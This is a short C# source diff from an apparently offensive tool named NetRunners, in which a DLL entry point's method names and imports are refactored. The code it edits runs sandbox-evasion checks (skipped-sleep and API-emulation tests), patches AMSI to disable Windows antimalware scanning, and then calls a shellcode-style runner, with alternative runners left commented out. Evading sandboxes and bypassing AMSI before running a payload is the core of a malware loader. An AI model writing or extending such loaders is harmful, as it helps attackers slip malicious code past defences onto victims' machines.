@@ -1,7 +1,7 @@
 ﻿using System;
-using static NetRunners.Heuristics;
-using static NetRunners.Patchers;
-using static NetRunners.Runners;
+using static NetRunners.Heuristics.Heuristics;
+using static NetRunners.Patchers.Patchers;
+using static NetRunners.Runners.Runners;
 
 namespace NetRunnersDll
 {
@@ -22,12 +22,12 @@ namespace NetRunnersDll
             if (Sleep()) { return; }    // if sleep was skipped halt execution
             if (NonEmulated()) { return; }    // if apis were not emulatd halt execution
             // patch amsi
-            AmsiOs();
+            patchAmsi();
 
             // Uncomment your choice
             // Runner();
             // PiRunner();
-            EpsRunner();
+            epsRun();
         }
     }
 }
